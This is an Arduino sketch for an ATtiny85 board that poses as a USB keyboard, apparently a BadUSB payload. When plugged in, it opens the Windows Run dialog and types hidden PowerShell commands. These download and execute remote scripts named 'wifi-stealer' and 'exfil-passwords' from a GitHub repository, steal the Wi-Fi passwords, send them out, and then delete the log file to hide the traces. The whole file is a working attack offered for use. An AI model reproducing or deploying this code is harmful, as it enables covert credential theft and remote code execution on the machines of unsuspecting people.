#include "DigiKeyboardFr.h"

#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

#define stealScript "https://raw.githubusercontent.com/nactrimo/ATtiny85-Hacks/main/wifi-stealer"
#define exfilScript "https://raw.githubusercontent.com/nactrimo/ATtiny85-Hacks/main/exfil-passwords"
#define token ""

void setup() {
  // put your setup code here, to run once:
  pinMode(1, OUTPUT); //LED on Model A 

}

void my_delay(int number) {
  DigiKeyboardFr.delay(number);
}

void get_wifipasswords() {
  //WIN+R (run)
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  my_delay(200);
  DigiKeyboardFr.println("powershell -windowstyle hidden IEX(wget " stealScript " | select content)");
  my_delay(5000); // wait untill powershell script finishes
}

void exfil_wifipasswords() {
  DigiKeyboardFr.sendKeyStroke(0);
  my_delay(1000);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  my_delay(200);
  DigiKeyboardFr.println("powershell.exe -w Hidden");
  my_delay(1000);
  DigiKeyboardFr.println("iex(wget " exfilScript " | select -ExpandProperty content)");
  my_delay(1000);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  my_delay(1000);
  DigiKeyboardFr.println("rm Log.txt");
  DigiKeyboardFr.println("exit");
}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboardFr.update();
  DigiKeyboardFr.sendKeyStroke(0);
  my_delay(3000);
  get_wifipasswords();
  exfil_wifipasswords();
  my_delay(9000);
  digitalWrite(1, HIGH); 
  my_delay(90000);
  digitalWrite(1, LOW); 
  my_delay(5000);

}
